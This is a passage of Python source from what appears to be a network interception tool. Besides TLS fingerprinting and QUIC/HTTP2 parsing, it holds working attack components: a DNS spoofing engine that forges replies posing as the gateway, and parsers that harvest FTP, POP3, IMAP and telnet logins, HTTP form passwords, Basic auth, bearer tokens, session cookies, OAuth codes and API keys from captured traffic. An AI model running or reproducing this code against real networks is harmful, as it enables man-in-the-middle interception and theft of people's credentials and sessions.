                                "-".join(str(c) for c in result["curve_ids"]),
                                "-".join(str(f)
                                          for f in result["ec_point_formats"])])
            result["ja3"] = hashlib.md5(ja3_str.encode()).hexdigest()
            result["ja3_raw"] = ja3_str
        except Exception: pass
        try:
            ciphers_ng = [c for c in raw_ciphers if c not in GREASE_SET]
            exts_ng = [et for et, _ in raw_exts if et not in GREASE_SET]
            max_ver = None
            for v in result["supported_versions"]:
                try:
                    vv = int(v, 16)
                    if max_ver is None or vv > max_ver: max_ver = vv
                except Exception: pass
            if max_ver is not None:
                tls_ver = TLS_MAPPER.get(_hex16(max_ver), "00")
            else:
                tls_ver = TLS_MAPPER.get(_hex16(ch_version), "00")
            ct = f"{min(len(ciphers_ng), 99):02d}"
            et_count = f"{min(len(exts_ng), 99):02d}"
            sni_flag = "d" if result["sni"] else "i"
            alpn = "00"
            if result["alpn"]:
                a = result["alpn"]
                if len(a) >= 2:
                    first = ord(a[0]); last = ord(a[-1])
                    if 32 <= first < 127 and 32 <= last < 127:
                        alpn = a[0] + a[-1]
                    else:
                        alpn = f"{(first>>4)&0xf:x}{last&0xf:x}"
                else:
                    alpn = a[:1] + "0"
            if len(alpn) < 2: alpn = (alpn + "00")[:2]
            prefix = f"t{tls_ver}{sni_flag}{ct}{et_count}{alpn}"
            sorted_ciphers = sorted(f"{c:04x}" for c in ciphers_ng)
            b = hashlib.sha256(",".join(sorted_ciphers).encode()).hexdigest()[:12]
            exts_for_hash = sorted(f"{e:04x}" for e in exts_ng
                                    if e not in (0x0000, 0x0010))
            ext_input = ",".join(exts_for_hash)
            if result["sig_algs"]:
                ext_input += "_" + ",".join(f"{s:04x}"
                                             for s in result["sig_algs"])
            c = hashlib.sha256(ext_input.encode()).hexdigest()[:12]
            result["ja4"] = f"{prefix}_{b}_{c}"
            result["ja4_a"] = prefix; result["ja4_b"] = b; result["ja4_c"] = c
        except Exception: pass
        _classify_ja4(result)
    except Exception: pass
    return result

def _classify_ja4(r):
    prefix = r.get("ja4_a") or ""
    b = r.get("ja4_b") or ""
    c = r.get("ja4_c") or ""
    ciphers_ng = r.get("cipher_ids") or []
    exts_ng = r.get("extensions_raw") or []
    alpn = r.get("alpn") or ""
    sigalgs = r.get("sig_algs") or []
    groups = r.get("curve_ids") or []
    had_grease = r.get("grease_present", False)
    had_sni = bool(r.get("sni"))
    for e in JA4_KNOWN:
        if prefix == e["prefix"] and b == e["b"] and c == e["c"]:
            r["ja4_known"] = e["name"]
            r["ja4_confidence"] = "high"
            r["ja4_bot"] = (e["type"] == "bot")
            r["ja4_browser"] = (e["type"] == "browser")
            return
    for e in JA4_KNOWN:
        if prefix == e["prefix"] and b == e["b"]:
            r["ja4_known"] = e["name"] + " (c variant)"
            r["ja4_confidence"] = "high"
            r["ja4_bot"] = (e["type"] == "bot")
            r["ja4_browser"] = (e["type"] == "browser")
            return
    score = 0; reasons = []
    if not alpn: score += 15; reasons.append("no_alpn")
    elif alpn == "h1": score += 8; reasons.append("alpn_h1")
    ccount = len(ciphers_ng)
    if ccount < 8: score += 20; reasons.append("ciphers_lt8")
    elif ccount > 24: score += 12; reasons.append("ciphers_gt24")
    ecount = len(exts_ng)
    if ecount < 8: score += 15; reasons.append("exts_lt8")
    elif ecount < 11: score += 10; reasons.append("exts_lt11")
    if not had_sni: score += 12; reasons.append("no_sni")
    if sigalgs and (len(sigalgs) < 8 or len(sigalgs) > 16):
        score += 6; reasons.append("sigalgs_anomalous")
    if groups and (len(groups) < 3 or len(groups) > 6):
        score += 6; reasons.append("groups_anomalous")
    if not had_grease: score += 8; reasons.append("no_grease")
    is_browser_prefix = (prefix.startswith("t13d15")
                          or prefix.startswith("t13d17")
                          or prefix.startswith("t13d20"))
    is_tls13_prefix = prefix.startswith("t13d") or prefix.startswith("t13i")
    if is_browser_prefix: score -= 3
    elif is_tls13_prefix: score += 3; reasons.append("non_browser_prefix")
    if prefix.startswith("t12"): score += 10; reasons.append("tls12_prefix")
    if score >= 25:
        r["ja4_bot"] = True; r["ja4_browser"] = False
        r["ja4_known"] = ";".join(reasons) or "unrecognized"
        r["ja4_confidence"] = "high"
    elif score >= 15:
        r["ja4_bot"] = True; r["ja4_browser"] = False
        r["ja4_known"] = ";".join(reasons) or "unrecognized"
        r["ja4_confidence"] = "medium"
    elif score <= -10 and is_browser_prefix:
        r["ja4_bot"] = False; r["ja4_browser"] = True
        r["ja4_known"] = "weighted_low_score"
        r["ja4_confidence"] = "medium"
    else:
        r["ja4_bot"] = True; r["ja4_browser"] = False
        r["ja4_known"] = ";".join(reasons) or "unrecognized"
        r["ja4_confidence"] = "low"

def _parse_server_hello_py(buf):
    result = {"ja3s": None, "ja3s_raw": None, "version": None,
              "cipher": None, "extensions_raw": [],
              "ja4s": None, "ja4s_a": None, "ja4s_b": None, "ja4s_c": None}
    try:
        if len(buf) < 6 or buf[0] != 0x16: return result
        rec_len = (buf[3] << 8) | buf[4]
        if len(buf) < 5 + rec_len: return result
        hs = buf[5:5 + rec_len]
        if len(hs) < 4 or hs[0] != 0x02: return result
        hs_len = (hs[1] << 16) | (hs[2] << 8) | hs[3]
        body = hs[4:4 + hs_len]
        if len(body) < 38: return result
        ver = (body[0] << 8) | body[1]
        result["version"] = _hex16(ver)
        cs = (body[34] << 8) | body[35]
        result["cipher"] = _hex16(cs)
        ext_ids = []
        if len(body) > 38:
            ext_len = (body[36] << 8) | body[37]
            ep = 38; end = min(len(body), 38 + ext_len)
            while ep + 4 <= end:
                et = (body[ep] << 8) | body[ep + 1]
                es = (body[ep + 2] << 8) | body[ep + 3]
                if et not in GREASE_SET:
                    ext_ids.append(et)
                ep += 4 + es
        result["extensions_raw"] = ext_ids
        try:
            ja3s_str = ",".join([str(ver), str(cs),
                                  "-".join(str(e) for e in ext_ids)])
            result["ja3s"] = hashlib.md5(ja3s_str.encode()).hexdigest()
            result["ja3s_raw"] = ja3s_str
        except Exception: pass
        try:
            tls_ver = TLS_MAPPER.get(_hex16(ver), "00")
            et_count = f"{min(len(ext_ids), 99):02d}"
            ext_hash = hashlib.sha256(
                ",".join(sorted(f"{e:04x}" for e in ext_ids)).encode()
            ).hexdigest()[:12] if ext_ids else "0" * 12
            cipher_hash = f"{cs:04x}"
            result["ja4s_a"] = f"t{tls_ver}{et_count}"
            result["ja4s_b"] = cipher_hash
            result["ja4s_c"] = ext_hash
            result["ja4s"] = f"{result['ja4s_a']}_{cipher_hash}_{ext_hash}"
        except Exception: pass
    except Exception: pass
    return result

def _parse_quic_initial_py(buf):
    result = {"dcid": None, "scid": None, "version": None,
              "is_initial": False, "is_retry": False, "token": None}
    try:
        if len(buf) < 7: return result
        first = buf[0]
        if not (first & 0x80): return result
        version = buf[1:5]
        dcil = buf[5]
        if len(buf) < 6 + dcil + 1: return result
        dcid = buf[6:6 + dcil]
        off = 6 + dcil
        scil = buf[off]; off += 1
        scid = buf[off:off + scil]
        result["dcid"] = dcid.hex()
        result["scid"] = scid.hex()
        result["version"] = version.hex()
        ptype = (first & 0x30) >> 4
        result["is_initial"] = (ptype == 0)
        if version == b"\x00\x00\x00\x00":
            result["is_retry"] = True
        if result["is_initial"] and off < len(buf):
            try:
                tok_len = (buf[off] << 8) | buf[off + 1]
                off += 2
                if off + tok_len <= len(buf):
                    result["token"] = buf[off:off + tok_len]
            except Exception: pass
    except Exception: pass
    return result

def _parse_quic_retry_py(buf):
    result = {"dcid": None, "scid": None, "version": None,
              "is_retry": False, "token": None, "integrity": None}
    try:
        if len(buf) < 7: return result
        first = buf[0]
        if not (first & 0x80): return result
        version = buf[1:5]
        if version != b"\x00\x00\x00\x00": return result
        result["is_retry"] = True
        dcil = buf[5]
        dcid = buf[6:6 + dcil]
        off = 6 + dcil
        scil = buf[off]; off += 1
        scid = buf[off:off + scil]
        off += scil
        result["dcid"] = dcid.hex(); result["scid"] = scid.hex()
        if off + 16 <= len(buf):
            result["token"] = buf[off:len(buf) - 16]
            result["integrity"] = buf[-16:].hex()
    except Exception: pass
    return result

_HPACK_STATIC = [
    (":authority", ""), (":method", "GET"), (":method", "POST"),
    (":path", "/"), (":path", "/index.html"), (":scheme", "http"),
    (":scheme", "https"), (":status", "200"), (":status", "204"),
    (":status", "206"), (":status", "304"), (":status", "400"),
    (":status", "404"), (":status", "500"), ("accept-charset", ""),
    ("accept-encoding", "gzip, deflate"), ("accept-language", ""),
    ("accept-ranges", ""), ("accept", ""), ("access-control-allow-origin", ""),
    ("age", ""), ("allow", ""), ("authorization", ""), ("cache-control", ""),
    ("content-disposition", ""), ("content-encoding", ""),
    ("content-language", ""), ("content-length", ""), ("content-location", ""),
    ("content-range", ""), ("content-type", ""), ("cookie", ""),
    ("date", ""), ("etag", ""), ("expect", ""), ("expires", ""),
    ("from", ""), ("host", ""), ("if-match", ""), ("if-modified-since", ""),
    ("if-none-match", ""), ("if-range", ""), ("if-unmodified-since", ""),
    ("last-modified", ""), ("link", ""), ("location", ""),
    ("max-forwards", ""), ("proxy-authenticate", ""),
    ("proxy-authorization", ""), ("range", ""), ("referer", ""),
    ("refresh", ""), ("retry-after", ""), ("server", ""),
    ("set-cookie", ""), ("strict-transport-security", ""),
    ("transfer-encoding", ""), ("user-agent", ""), ("vary", ""),
    ("via", ""), ("www-authenticate", ""),
]

def _skip_hpack_string(buf, i):
    if i >= len(buf): return i
    b = buf[i]
    if b & 0x80:
        if i + 1 >= len(buf): return i + 1
        ln = (b & 0x7f); i += 1
        return i + ln
    else:
        return i + 1

def _hpack_decode_py(payload):
    out = []
    try:
        i = 0
        while i < len(payload):
            b = payload[i]
            if b & 0x80:
                idx = b & 0x7f
                if idx < len(_HPACK_STATIC):
                    out.append(_HPACK_STATIC[idx][0])
                i += 1
            elif b & 0x40:
                i += 1
                i = _skip_hpack_string(payload, i)
                i = _skip_hpack_string(payload, i)
            elif b & 0x20:
                i += 1
            else:
                i = _skip_hpack_string(payload, i)
                i = _skip_hpack_string(payload, i)
    except Exception: pass
    return out

def _parse_h2_settings_py(buf):
    result = {"frames": [], "settings": {}, "headers": [], "push": 0}
    try:
        i = 0
        while i + 9 <= len(buf):
            length = (buf[i] << 16) | (buf[i + 1] << 8) | buf[i + 2]
            ftype = buf[i + 3]; flags = buf[i + 4]
            sid = ((buf[i + 5] & 0x7f) << 24) | (buf[i + 6] << 16) \
                | (buf[i + 7] << 8) | buf[i + 8]
            i += 9
            if i + length > len(buf): break
            payload = buf[i:i + length]; i += length
            result["frames"].append((ftype, flags, sid, length))
            if ftype == 0x04 and len(payload) >= 6:
                for j in range(0, len(payload) - 5, 6):
                    k = (payload[j] << 8) | payload[j + 1]
                    v = ((payload[j + 2] << 24) | (payload[j + 3] << 16)
                         | (payload[j + 4] << 8) | payload[j + 5])
                    result["settings"][k] = v
            elif ftype == 0x05:
                result["push"] += 1
            elif ftype == 0x01:
                headers = _hpack_decode_py(payload)
                result["headers"].extend(headers)
    except Exception: pass
    return result

class DNSSurface:
    def __init__(self, iface, my_ip, my_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.running = False; self.rules = []
        self.sock = None; self._lock = threading.RLock()
        self.stats = Counter(); self.warm_cache = {}
    def add_rule(self, pattern, response, kind="wildcard", device=None):
        with self._lock:
            self.rules.append({"pattern": pattern, "response": response,
                                "kind": kind, "device": device,
                                "ts": time.time()})
    def warm(self, qname, answer_ip):
        self.warm_cache[qname.lower()] = answer_ip
    def _match(self, qname, src_ip):
        ql = qname.lower().rstrip(".")
        with self._lock: rules = list(self.rules)
        for r in rules:
            if r.get("device") and r["device"] != src_ip: continue
            p = r["pattern"].lower()
            if r["kind"] == "exact" and p == ql: return r
            if r["kind"] == "wildcard":
                if p.startswith("*.") and ql.endswith(p[1:]): return r
                if p == ql: return r
            if r["kind"] == "regex":
                try:
                    if re.match(p, ql): return r
                except Exception: pass
            if r["kind"] == "substring" and p in ql: return r
        return None
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(0x0003))
            self.sock.bind((self.iface, 0))
        except Exception as e:
            console.log(f"[red]DNS socket failed: {e}[/]"); return False
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]DNS surface online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running:
            try: frame = self.sock.recv(65535)
            except Exception: time.sleep(0.1); continue
            try: self._handle(frame)
            except Exception: pass
    def _handle(self, frame):
        try: eth = dpkt.ethernet.Ethernet(frame)
        except Exception: return
        if not isinstance(eth.data, dpkt.ip.IP): return
        ip = eth.data
        if not isinstance(ip.data, dpkt.udp.UDP): return
        udp = ip.data
        if udp.dport != 53 and udp.sport != 53: return
        if len(udp.data) < 12: return
        try: dns = dpkt.dns.DNS(udp.data)
        except Exception: return
        if dns.qr != 0 or not dns.qd: return
        q = dns.qd[0]; qname = q.name.rstrip(".")
        src_ip = socket.inet_ntoa(ip.src)
        rule = self._match(qname, src_ip)
        warm = self.warm_cache.get(qname.lower())
        if not rule and warm:
            rule = {"response": warm, "kind": "warm"}
        if not rule or rule["response"] is None: return
        self.stats["matched"] += 1
        self._send_reply(ip, udp, dns, q, rule["response"])
        with STATE.lock:
            STATE.alerts.append((time.time(),
                f"[INJ] DNS FORGED {qname} -> {rule['response']} for {src_ip}"))
            STATE.dirty += 1
        _emit_event("dns_forge",
                    f"{qname}->{rule['response']} for {src_ip}", "injected")
    def _send_reply(self, req_ip, req_udp, req_dns, q, answer_ip):
        try:
            ans = dpkt.dns.DNS(
                id=req_dns.id, qr=1, opcode=req_dns.opcode,
                aa=1, rd=req_dns.rd, ra=1, rcode=0, qd=req_dns.qd,
                an=[dpkt.dns.DNS.RR(name=q.name, type=dpkt.dns.DNS_A,
                                     cls=dpkt.dns.DNS_IN, ttl=30,
                                     rdata=socket.inet_aton(answer_ip))])
            payload = bytes(ans)
            udp = dpkt.udp.UDP(sport=53, dport=req_udp.sport, data=payload)
            udp.ulen = len(udp)
            ip = dpkt.ip.IP(
                src=socket.inet_aton(CONFIG.get("gateway_ip") or "0.0.0.0"),
                dst=req_ip.src, p=dpkt.ip.IP_PROTO_UDP, ttl=64, data=udp)
            ip.len = len(ip)
            src_mac = bytes.fromhex(self.my_mac.replace(":", ""))
            dst_mac = b"\xff" * 6
            frame = dst_mac + src_mac + struct.pack("!H", 0x0800) + bytes(ip)
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            s.bind((self.iface, 0)); s.send(frame); s.close()
        except Exception: pass

class DNSBLEngine:
    def __init__(self):
        self.running = False
    def start(self):
        self.running = True
        console.log(f"[green]DNSBL engine online ({len(_DNSBL)} domains)[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, name, kind="dns"):
        if not name: return None
        hit = _dnsbl_match(name)
        if not hit: return None
        ts = time.time()
        with STATE.lock:
            STATE.dnsbl_hits.append((ts, src_ip, name, hit, kind))
            STATE.dnsbl_devices[src_ip] = \
                STATE.dnsbl_devices.get(src_ip, 0) + 1
            STATE.dnsbl_domains[hit] = STATE.dnsbl_domains.get(hit, 0) + 1
            d = STATE.devices.get(src_ip)
            if d is not None:
                d.dnsbl_score += 1
                d.dnsbl_hits.append((ts, name, hit, kind))
            STATE.dirty += 1
        _emit_event("dnsbl", f"{src_ip} -> {name} (matched {hit})", "observed")
        return hit

class ProtoCredParser:
    def __init__(self): self.running = False
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]Proto cred parser online[/]")
        return True
    def stop(self): self.running = False
    def feed(self, key, port, payload):
        if not payload: return
        try: text = payload[:1024].decode("utf-8", "ignore")
        except Exception: return
        up = text.upper()
        try:
            if port == 21:
                if up.startswith("USER "):
                    with STATE.lock:
                        STATE.proto_creds.append((time.time(), "ftp", key,
                                                   "user", text[5:].strip()))
                elif up.startswith("PASS "):
                    with STATE.lock:
                        STATE.proto_creds.append((time.time(), "ftp", key,
                                                   "pass", text[5:].strip()))
                        STATE.credentials.append((time.time(), "ftp",
                                                   text.strip()[:200]))
                        STATE.dirty += 1
            elif port == 110:
                if up.startswith("USER "):
                    with STATE.lock:
                        STATE.proto_creds.append((time.time(), "pop3", key,
                                                   "user", text[5:].strip()))
                elif up.startswith("PASS "):
                    with STATE.lock:
                        STATE.proto_creds.append((time.time(), "pop3", key,
                                                   "pass", text[5:].strip()))
                        STATE.credentials.append((time.time(), "pop3",
                                                   text.strip()[:200]))
                        STATE.dirty += 1
            elif port == 143:
                if "LOGIN " in up:
                    parts = text.split()
                    if len(parts) >= 3:
                        with STATE.lock:
                            STATE.proto_creds.append((time.time(), "imap", key,
                                "login", f"{parts[1]} {parts[2]}"[:200]))
                            STATE.credentials.append((time.time(), "imap",
                                f"{parts[1]}:{parts[2]}"[:200]))
                            STATE.dirty += 1
            elif port in (25, 587):
                if up.startswith("AUTH "):
                    with STATE.lock:
                        STATE.proto_creds.append((time.time(), "smtp", key,
                                                   "auth", text[:200]))
            elif port == 23:
                if "LOGIN" in up or "USERNAME" in up or "PASSWORD" in up:
                    with STATE.lock:
                        STATE.proto_creds.append((time.time(), "telnet", key,
                                                   "prompt", text[:100]))
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running: time.sleep(6)

class HTTPParser:
    def __init__(self):
        self.running = False; self.buffers = {}
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]HTTP parser online[/]")
        return True
    def stop(self): self.running = False
    def feed(self, key, direction, payload, stream_id=None):
        if not payload: return
        buf_key = (key, direction, stream_id)
        with self._lock:
            buf = self.buffers.setdefault(buf_key, bytearray())
            buf.extend(payload)
            if len(buf) > 262144: del buf[:131072]
        self._try_parse(key, direction, stream_id)
    def _try_parse(self, key, direction, stream_id=None):
        buf_key = (key, direction, stream_id)
        with self._lock: buf = bytes(self.buffers.get(buf_key, b""))
        if not buf: return
        try:
            if direction == "req":
                if not any(buf.startswith(m) for m in HTTP_METHODS): return
                hdr_end = buf.find(b"\r\n\r\n")
                if hdr_end < 0: return
                head = buf[:hdr_end].decode("latin-1", "replace")
                lines = head.split("\r\n")
                if not lines: return
                parts = lines[0].split(" ")
                if len(parts) < 3: return
                method, path, version = parts[0], parts[1], parts[2]
                headers = {}
                for ln in lines[1:]:
                    if ":" in ln:
                        k, v = ln.split(":", 1)
                        headers[k.strip().lower()] = v.strip()
                body_start = hdr_end + 4
                te = headers.get("transfer-encoding", "").lower()
                if "chunked" in te:
                    body = self._decode_chunked(buf[body_start:])
                    if body is None: return
                    consumed = len(buf) - body_start
                else:
                    clen = int(headers.get("content-length", "0") or 0)
                    if len(buf) - body_start < clen: return
                    body = buf[body_start:body_start + clen]
                    consumed = clen
                req = {"ts": time.time(), "method": method, "path": path,
                       "version": version, "headers": headers, "body": body,
                       "host": headers.get("host", ""), "key": key}
                with STATE.lock:
                    STATE.http_requests.append(req)
                    STATE.dirty += 1
                self._extract_tokens(req)
                self._extract_creds(req)
                self._extract_oauth(req)
                self._extract_ua(req)
                if REPLAY_ENGINE: REPLAY_ENGINE.store_req(req)
                if BEHAVIOR_TIMING:
                    try: BEHAVIOR_TIMING.observe(key[0], time.time())
                    except Exception: pass
                with self._lock:
                    remaining = buf[body_start + consumed:]
                    if remaining: self.buffers[buf_key] = bytearray(remaining)
                    else: self.buffers.pop(buf_key, None)
            else:
                hdr_end = buf.find(b"\r\n\r\n")
                if hdr_end < 0: return
                head = buf[:hdr_end].decode("latin-1", "replace")
                lines = head.split("\r\n")
                if not lines: return
                parts = lines[0].split(" ", 2)
                if len(parts) < 2: return
                try: status = int(parts[1])
                except Exception: status = 0
                headers = {}
                for ln in lines[1:]:
                    if ":" in ln:
                        k, v = ln.split(":", 1)
                        headers[k.strip().lower()] = v.strip()
                body_start = hdr_end + 4
                te = headers.get("transfer-encoding", "").lower()
                if "chunked" in te:
                    body_raw = self._decode_chunked(buf[body_start:])
                    if body_raw is None: return
                    consumed = len(buf) - body_start
                else:
                    clen = int(headers.get("content-length", "0") or 0)
                    if len(buf) - body_start < clen: return
                    body_raw = buf[body_start:body_start + clen]
                    consumed = clen
                body = _decompress(body_raw,
                                    headers.get("content-encoding", ""))
                resp = {"ts": time.time(), "status": status,
                        "headers": headers, "body": body,
                        "body_raw": body_raw, "key": key}
                with STATE.lock:
                    STATE.http_responses.append(resp)
                    STATE.dirty += 1
                self._extract_cookies(resp)
                self._extract_csrf(resp)
                if H2_PUSH: H2_PUSH.observe(resp)
                if JA4S_FID:
                    try:
                        sni = resp["key"][2] if len(resp["key"]) > 2 else None
                        ja4s = resp["headers"].get("x-ja4s")
                        if sni and ja4s: JA4S_FID.register(sni, ja4s)
                    except Exception: pass
                if len(body_raw) > 0:
                    with STATE.lock:
                        STATE.bodies.append((time.time(), str(key)[:60],
                                              str(resp["key"]), len(body_raw),
                                              body_raw[:200]))
                        STATE.dirty += 1
                with self._lock:
                    remaining = buf[body_start + consumed:]
                    if remaining: self.buffers[buf_key] = bytearray(remaining)
                    else: self.buffers.pop(buf_key, None)
        except Exception: pass
    def _decode_chunked(self, buf):
        out = bytearray(); i = 0
        try:
            while i < len(buf):
                j = buf.find(b"\r\n", i)
                if j < 0: return None
                sz_line = buf[i:j].split(b";", 1)[0].strip()
                try: sz = int(sz_line, 16)
                except Exception: return None
                i = j + 2
                if sz == 0: return bytes(out)
                if i + sz + 2 > len(buf): return None
                out.extend(buf[i:i + sz]); i += sz + 2
        except Exception: return None
        return bytes(out)
    def _extract_tokens(self, req):
        headers = req["headers"]
        host = req["host"]
        with STATE.lock:
            if "authorization" in headers:
                val = headers["authorization"]
                STATE.tokens.append((time.time(), host,
                                      "authorization", val[:400]))
                STATE.dirty += 1
                if CROSS_APP_CORR:
                    try: CROSS_APP_CORR.observe_token(req["key"][0], val)
                    except Exception: pass
                if val.lower().startswith("bearer "):
                    tok = val[7:].strip()
                    jwt = _decode_jwt(tok)
                    if jwt:
                        STATE.jwts.append((time.time(), host, jwt, tok))
                        STATE.dirty += 1
                        if CROSS_APP_CORR:
                            try:
                                CROSS_APP_CORR.observe_jwt(
                                    req["key"][0], jwt.get("payload", {}))
                            except Exception: pass
                        if JWT_WATCHER:
                            try: JWT_WATCHER.observe_jwt(host, jwt)
                            except Exception: pass
            if "cookie" in headers:
                for c in _parse_cookie_header(headers["cookie"]):
                    if any(kw in c["name"].lower() for kw in
                            ("session","token","auth","jwt","sid",
                             "bearer","csrf","xsrf")):
                        STATE.tokens.append((time.time(), host,
                            f"cookie:{c['name']}", c["value"][:200]))
                        STATE.dirty += 1
                        if CROSS_APP_CORR:
                            try:
                                CROSS_APP_CORR.observe_token(req["key"][0],
                                                              c["value"])
                            except Exception: pass
                        if "refresh" in c["name"].lower() and REFRESH_WATCH:
                            try: REFRESH_WATCH.observe(host, c["value"])
                            except Exception: pass
                    STATE.cookie_jar[host][c["name"]] = c["value"]
                    STATE.cookies.append((time.time(), host, c["name"],
                                           c["value"][:200], "req"))
                    STATE.cookie_graph[host].add(c["name"])
                    if COOKIE_GRAPH:
                        try: COOKIE_GRAPH.observe(host, c["name"])
                        except Exception: pass
            if "x-api-key" in headers:
                STATE.tokens.append((time.time(), host,
                                      "x-api-key", headers["x-api-key"][:200]))
                STATE.dirty += 1
            if "x-csrf-token" in headers:
                STATE.csrf_tokens.append((time.time(), host,
                    "x-csrf-token", headers["x-csrf-token"][:200]))
                STATE.dirty += 1
    def _extract_cookies(self, resp):
        headers = resp["headers"]
        if "set-cookie" not in headers: return
        sc = headers["set-cookie"]
        vals = [sc] if isinstance(sc, str) else sc
        for v in vals:
            parsed = _parse_set_cookie(v)
            if not parsed: continue
            name = parsed["name"]; value = parsed["value"]
            with STATE.lock:
                STATE.cookies.append((time.time(), str(resp["key"]),
                                       name, value[:200], "set"))
                STATE.cookie_jar[str(resp["key"])][name] = value
                STATE.cookie_graph[str(resp["key"])].add(name)
                STATE.dirty += 1
                if any(kw in name.lower() for kw in
                        ("session","token","auth","jwt","sid","bearer")):
                    STATE.tokens.append((time.time(), str(resp["key"]),
                                          f"setcookie:{name}", value[:200]))
                if "refresh" in name.lower() and REFRESH_WATCH:
                    try: REFRESH_WATCH.observe(str(resp["key"]), value)
                    except Exception: pass
                if value and value.startswith("eyJ") and value.count(".") == 2:
                    jwt = _decode_jwt(value)
                    if jwt:
                        STATE.jwts.append((time.time(), str(resp["key"]),
                                            jwt, value))
                        if JWT_WATCHER:
                            try: JWT_WATCHER.observe_jwt(str(resp["key"]), jwt)
                            except Exception: pass
    def _extract_csrf(self, resp):
        body = resp.get("body", b"")
        ctype = resp["headers"].get("content-type", "").lower()
        if "html" not in ctype: return
        tokens = []
        try:
            text = body.decode("utf-8", "replace")
            for m in re.finditer(
                r'<input[^>]*name="([^"]*(?:csrf|xsrf|token|_token)[^"]*)"'
                r'[^>]*value="([^"]+)"', text, re.I):
                tokens.append({"field": m.group(1), "value": m.group(2)})
            for m in re.finditer(
                r'<meta[^>]*name="([^"]*(?:csrf|xsrf)[^"]*)"'
                r'[^>]*content="([^"]+)"', text, re.I):
                tokens.append({"field": m.group(1), "value": m.group(2)})
        except Exception: pass
        with STATE.lock:
            for t in tokens:
                STATE.csrf_tokens.append((time.time(), str(resp["key"]),
                                           t["field"], t["value"]))
            if tokens and CONFIG.get("form_parse_enabled"):
                STATE.forms.append((time.time(), str(resp["key"]), tokens))
            STATE.dirty += 1
    def _extract_oauth(self, req):
        try:
            path = req.get("path", "")
            if "?" in path:
                params = urllib.parse.parse_qs(path.split("?", 1)[1])
                code = params.get("code", [None])[0]
                state = params.get("state", [None])[0]
                if code or state:
                    with STATE.lock:
                        STATE.oauth_flows.append((time.time(), req["host"],
                                                   code, state,
                                                   req["method"]))
                        STATE.dirty += 1
                    if CROSS_APP_CORR and state:
                        try:
                            CROSS_APP_CORR.observe_oauth(req["key"][0], state)
                        except Exception: pass
        except Exception: pass
    def _extract_ua(self, req):
        ua = req["headers"].get("user-agent")
        if not ua: return
        is_browser = _ua_is_browser(ua)
        is_bot = _ua_is_bot(ua)
        with STATE.lock:
            STATE.ua_hits.append((time.time(), req["key"][0], ua[:200],
                                   is_browser, is_bot))
            STATE.dirty += 1
            d = STATE.devices.get(req["key"][0])
            if d is not None:
                d.user_agents.append((time.time(), ua[:200]))
                d.ua_browser = d.ua_browser or is_browser
                d.ua_bot = d.ua_bot or is_bot
    def _extract_creds(self, req):
        ctype = req["headers"].get("content-type", "").lower()
        body = req.get("body", b"")
        if not body: return
        forms = []
        try:
            if "application/x-www-form-urlencoded" in ctype:
                parsed = urllib.parse.parse_qs(
                    body.decode("utf-8", "replace"), keep_blank_values=True)
                for k, v in parsed.items():
                    forms.append({"field": k, "value": v[0] if v else ""})
        except Exception: pass
        if forms:
            with STATE.lock:
                STATE.forms.append((time.time(), req["host"], forms))
            for f in forms:
                lf = (f.get("field") or "").lower()
                if any(k in lf for k in ("password","passwd","pwd","pass",
                                           "user","username","login","email",
                                           "otp","token","secret","pin")):
                    with STATE.lock:
                        STATE.credentials.append((time.time(), req["host"],
                            f"{f['field']}={f.get('value','')}"[:512]))
                        STATE.dirty += 1
                    _emit_event("cred", f"{f['field']} to {req['host']}",
                                "observed")
        auth = req["headers"].get("authorization", "")
        if auth.lower().startswith("basic "):
            try:
                decoded = base64.b64decode(auth[6:].strip()).decode(
                    "utf-8", "replace")
                with STATE.lock:
                    STATE.credentials.append((time.time(), req["host"],
                                               f"basic:{decoded}"[:512]))
                    STATE.dirty += 1
            except Exception: pass
    def _loop(self):
        while self.running and STATE.running: time.sleep(5)

class CredSniffer:
    def __init__(self):
        self.running = False
        self.patterns = [
            (re.compile(rb"(?i)password[\"'\s:=]+([^\s\"'&]{3,64})"), "password"),
            (re.compile(rb"(?i)passwd[\"'\s:=]+([^\s\"'&]{3,64})"), "passwd"),
            (re.compile(rb"(?i)pwd[\"'\s:=]+([^\s\"'&]{3,64})"), "pwd"),
            (re.compile(rb"(?i)user(name)?[\"'\s:=]+([^\s\"'&]{3,64})"),
             "username"),
            (re.compile(rb"(?i)login[\"'\s:=]+([^\s\"'&]{3,64})"), "login"),
            (re.compile(rb"(?i)api[_-]?key[\"'\s:=]+([^\s\"'&]{8,128})"),
             "api_key"),
            (re.compile(rb"(?i)secret[\"'\s:=]+([^\s\"'&]{8,128})"), "secret"),
            (re.compile(rb"(?i)token[\"'\s:=]+([^\s\"'&]{8,128})"), "token"),
        ]
    def start(self):
        self.running = True
        console.log("[green]Cred sniffer online[/]")
        return True
    def stop(self): self.running = False
    def scan(self, payload, src_ip, host=None):
        if not payload: return []
        hits = []
        for pat, label in self.patterns:
            for m in pat.finditer(payload[:8192]):
                try:
                    val = m.group(m.lastindex).decode("utf-8", "ignore")
                except Exception:
                    val = m.group(m.lastindex).decode("latin-1", "ignore")
                hits.append((label, val))
                with STATE.lock:
                    STATE.credentials.append((time.time(), host or src_ip,
                                               f"sniffed {label}={val}"[:512]))
                    STATE.dirty += 1
        return hits

class TokenHarvester:
    def __init__(self):
        self.running = False
        self.token_re = re.compile(
            rb"(?i)(bearer\s+([A-Za-z0-9\-._~+/]{20,}))|"
            rb"(eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)|"
            rb"(sk_[A-Za-z0-9]{20,})|"
            rb"(xox[baprs]-[A-Za-z0-9\-]+)|"
            rb"(ghp_[A-Za-z0-9]{30,})|"
            rb"(AIza[0-9A-Za-z_\-]{30,})")
    def start(self):
        self.running = True
        console.log("[green]Token harvester online[/]")
        return True
    def stop(self): self.running = False
    def scan(self, payload, src_ip, host=None):
        if not payload: return []
        out = []
        try:
            for m in self.token_re.finditer(payload[:16384]):
